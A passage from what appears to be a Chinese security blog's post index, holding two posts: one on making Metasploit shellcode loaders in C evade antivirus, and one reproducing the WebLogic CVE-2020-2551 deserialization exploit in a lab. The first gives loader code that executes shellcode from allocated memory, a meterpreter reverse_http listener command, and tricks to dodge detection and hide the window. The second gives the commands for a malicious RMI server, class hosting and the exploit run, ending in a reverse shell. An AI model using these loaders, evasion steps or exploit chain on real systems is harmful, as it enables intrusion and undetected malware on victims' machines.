src="https://i.loli.net/2020/08/30/GCZerU1cp9gEFH2.png" alt="msfvenom"><br>然后网上找了一段C语言加载shellcode的代码。。通过内联汇编加载shellcode：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">pragma</span> comment(linker, "/OPT:nowin98")</span><span class="token macro property">#<span class="token directive keyword">pragma</span> comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")</span><span class="token comment" spellcheck="true">//不显示窗口</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"shellcode"</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//内联汇编</span>    __asm       <span class="token punctuation">{</span>        lea eax<span class="token punctuation">,</span>buf<span class="token punctuation">;</span>           call eax<span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>话不多说，先编译上线测试，启动msf监听：</p><pre class="line-numbers language-shell"><code class="language-shell">handler -p windows/meterpreter/reverse_http -H 0.0.0.0 -P 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://i.loli.net/2020/08/30/y7BndOlu3JG8PKt.png" alt="handler"><br> 另一边编译源码，生成exe:<br> <img src="https://i.loli.net/2020/08/30/oVZv6XKxrecbFAw.png" alt="Build_exe"><br> 双击执行exe,msf上线：<br> <img src="https://i.loli.net/2020/08/30/UyCWEo2DpJdAu84.png" alt="reverse_meterpreter"><br> 执行过程发现没有被拦截，看起来这已经免杀了：<br> <img src="https://i.loli.net/2020/08/30/RvXdq423TsuyhNE.png" alt="免杀成功"><br> 好的，免杀成功，本文结束。</p><h4 id="3-VS免杀测试"><a href="#3-VS免杀测试" class="headerlink" title="3. VS免杀测试"></a>3. VS免杀测试</h4><p>  结束是不可能结束的，不然怎么混篇幅，只能换个不免杀的编译器，被杀了再随便改改源码这样子。<br>  用VS2019来编译源码，启动vs:<br><img src="https://i.loli.net/2020/08/30/SWCNs72Iv8kcBxp.png" alt="start vs2019"></p><p><img src="https://i.loli.net/2020/08/30/rjUdwQhYV7m3Tpk.png" alt="创建项目"></p><p><img src="https://i.loli.net/2020/08/30/dmXu9wGJBg748rK.png" alt="复制代码编译"><br>是吧，被发现了，我们将恶意代码全部删除后编译，发现还是被杀：<br><img src="https://i.loli.net/2020/08/30/tVhmFpTIdPL9iBJ.png"><br>emmm? 怎么办啊，这都杀!? 其实有朋友应该注意到了下面这段代码，好吧 ，我是故意没删的，因为特征就是在这：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">pragma</span> comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来将这段代码删除，重新生成exe，然后进行扫描，发现成功过了杀软:<br><img src="https://i.loli.net/2020/08/30/lDvSHZB6jrOtFcU.png"></p><p>vs编译的这个内联加载不能正常上线，修改下加载方法：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"shellcode"</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> exec <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>exec<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>exec<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么编译执行后会有个DOS窗口：<br><img src="https://i.loli.net/2020/08/30/LVk8Qa3oDpbilH9.png"></p><p>这里我们<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">ShowWindow</a>函数来隐藏窗体：<br><img src="https://i.loli.net/2020/08/30/lf5rY1kmBswMRaq.png" alt="ShowWindow"><br>需要两个参数，一个是程序窗口句柄，可以通过<a href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">GetConsoleWindow</a> 来获得当前窗口句柄，另一个是int类型的nCmdShow，来控制窗口的状态，这里使用SW_HIDE来隐藏窗口：<br><img src="https://i.loli.net/2020/08/30/H5RLctbSJnQBorW.png" alt="nCmdShow"></p><pre class="line-numbers language-c"><code class="language-c"><span class="token function">ShowWindow</span><span class="token punctuation">(</span><span class="token function">GetConsoleWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> SW_HIDE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再编译执行和免杀测试，可以看到免杀且无窗口：<br><img src="https://i.loli.net/2020/08/30/sQ1j6vhLouC5dOb.png"></p><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://www.zhihu.com/question/282945808">https://www.zhihu.com/question/282945808</a><br><a href="https://blog.csdn.net/zac_sian/article/details/46778285">https://blog.csdn.net/zac_sian/article/details/46778285</a><br><a href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">https://docs.microsoft.com/en-us/windows/console/getconsolewindow</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msfvenom免杀 </tag>
            
            <tag> C语言免杀 </tag>
            
            <tag> 隐藏程序窗口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-2551复现</title>
      <link href="/2020/08/22/cve-2020-2551-fu-xian/"/>
      <url>/2020/08/22/cve-2020-2551-fu-xian/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><blockquote><p>2020年1月15日, Oracle官方发布了Weblogic IIOP反序列化漏洞CVE-2020-2551的漏洞通告，漏洞等级为高危，CVVS评分为9.8分，漏洞利用难度低。影响范围为10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0。</p></blockquote><h4 id="2-获取exp并配置编译"><a href="#2-获取exp并配置编译" class="headerlink" title="2. 获取exp并配置编译"></a>2. <a href="https://github.com/zzwlpx/weblogicPoc">获取exp</a>并配置编译</h4><p> <i class="far fa-hand-point-right"> 给项目配置JDK</i><br>  <img src="https://i.loli.net/2020/08/22/eqLaXfthxCWPFkb.png" alt="目录结构"></p><p>  <img src="https://i.loli.net/2020/08/22/MTPlbWHDxef7IaJ.png" alt="选择jdk"></p><p> <i class="far fa-hand-point-right"> 配置Modules</i><br> 选择src 后点 Sources,  选择out 后点 Excluded<br> <img src="https://i.loli.net/2020/08/22/94IgR1yeohwfvVc.png"><br> 选完之后，看到一排红：<br><img src="https://i.loli.net/2020/08/22/QzGhpBJ8mcwI4SE.png"><br> 这是因为有些包没导入，代码找不到，这里把lib文件夹下的包导入进项目：<br> <img src="https://i.loli.net/2020/08/22/HJzGVU4k5uQACiI.png"><br> 然后就没得报错了：<br><img src="https://i.loli.net/2020/08/22/sAg9FH5QVyDKwou.png"></p><p>  <i class="far fa-hand-point-right"> 打包配置</i><br>配置build:<br><img src="https://i.loli.net/2020/08/22/bSU72uhVIwdpGCn.png"><br>选择main函数：<br><img src="https://i.loli.net/2020/08/22/BR8ElPGQiuxXgew.png"><br>build打包成可执行文件：<br><img src="https://i.loli.net/2020/08/22/hKMricwEuIpgAJn.png"><br>发现又报错了，说没设置输出路径，配置一下:<br><img src="https://i.loli.net/2020/08/22/7mbKwzFtJElnU6g.png"></p><p><img src="https://i.loli.net/2020/08/22/l1fcKw7dn4mZpJe.png"><br>继续build，又报错：<br><img src="https://i.loli.net/2020/08/22/PxagBIbLeO8G9k6.png"><br>是上面的配置jdk下面那个project language level选高了 ，改成8，再来一次build，哇 成功输出文件：<br><img src="https://i.loli.net/2020/08/22/iX89Nomy2hObsAf.png"><br>马上就要运行一下，没问题了：<br><img src="https://i.loli.net/2020/08/22/BbRS5vzxPM2E8Gn.png"></p><p><img src="https://i.loli.net/2020/08/22/4i25J7BTXm1aNUQ.png"></p><h4 id="3-进行复现"><a href="#3-进行复现" class="headerlink" title="3. 进行复现"></a>3. 进行复现</h4><p><i class="far fa-hand-point-right">首测失败</i><br>用<a href="https://github.com/vulhub/vulhub">vulhub</a>搭建了一个weblogic环境，恶意rmi使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md">JNDI-Injection-Exploit</a>。但是这个工具编译版本为jdk1.7+,漏洞环境是jdk1.6，所以没成功，从下面日志中可以看到漏洞触发成功访问了rmi服务，但是接着报错不支持version 52，说明执行代码的jdk版本低于编译的jdk版本。搜到jdk版本和stanford parser对应关系是J2SE 8 = 52,J2SE 7 = 51,J2SE 6.0 = 50,J2SE 5.0 = 49,JDK 1.4 = 48,JDK 1.3 = 47,JDK 1.2 = 46,JDK 1.1 = 45，所以后面用指定编译版本为1.6编译exp。</p><p><img src="https://i.loli.net/2020/08/22/LnJFTZjINAUGHcO.png"></p><p><img src="https://i.loli.net/2020/08/22/pCW3QS8huHdq74i.png"><br><i class="far fa-hand-point-right">这下该成功了吧</i><br>1、使用<code>javac Poc.java -source 1.6 -target 1.6</code> 指定ban’y来编译我们的Poc.java:<br><img src="https://i.loli.net/2020/08/22/v7rx1BlsGL63Hbq.png"><br>并且启动一个web服务来让恶意类可以被访问到<code>python3 -m http.server 80</code></p><p>2、恶意rmi服务<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.111.1/#Poc" 1099</code><br> <img src="https://i.loli.net/2020/08/22/tvqyw4ViMRDs6X2.png"><br> 3、用poc测试<code>java -jar CVE-2020-2551.jar 192.168.111.130 7001 rmi://192.168.111.1:1099/Poc</code><br> <img src="https://i.loli.net/2020/08/22/QWrdZmLjRFpC4k9.png"><br> 4、可以看到weblogic请求rmi后从web服务器里获取到了恶意类：<br><img src="https://i.loli.net/2020/08/22/3cKysEfCUx7w5uA.png"><br>5、此时上漏洞环境查看目录，命令执行成功：<br><img src="https://i.loli.net/2020/08/22/mOjkndpgSUhMAZX.png"><br>6、反弹shell：<br><img src="https://i.loli.net/2020/08/22/9te16OBNi8huVcP.png" alt="执行流程"></p><p><img src="https://i.loli.net/2020/08/22/k9sf8bBZaKXMTrI.png" alt="成功后的日志"></p><hr><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://blog.csdn.net/m0_37961948/article/details/78161828?utm_source=blogxgwz3">https://blog.csdn.net/m0_37961948/article/details/78161828?utm_source=blogxgwz3</a><br><a href="https://www.cnblogs.com/zhaoqingqing/p/11847791.html">https://www.cnblogs.com/zhaoqingqing/p/11847791.html</a><br><a href="https://blog.csdn.net/weixin_43149083/article/details/89639747">https://blog.csdn.net/weixin_43149083/article/details/89639747</a><br><a href="https://y4er.com/post/weblogic-cve-2020-2551/">https://y4er.com/post/weblogic-cve-2020-2551/</a><br><a href="https://xz.aliyun.com/t/7374#toc-13">https://xz.aliyun.com/t/7374#toc-13</a><br><a href="https://xz.aliyun.com/t/7498">https://xz.aliyun.com/t/7498</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic漏洞 </tag>
            
            <tag> IDEA编译 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
